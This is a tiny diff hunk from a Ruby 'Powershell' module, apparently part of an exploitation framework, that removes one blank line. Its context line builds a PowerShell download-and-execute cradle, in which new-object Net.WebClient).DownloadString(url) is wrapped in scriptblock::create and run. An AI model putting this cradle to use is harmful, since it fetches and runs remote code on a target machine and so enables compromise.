@@ -152,7 +152,6 @@ module Powershell
           res << %Q^&([scriptblock]::create((new-object Net.WebClient).DownloadString('#{url}')));^
         end
       end
-
       res
     end
 
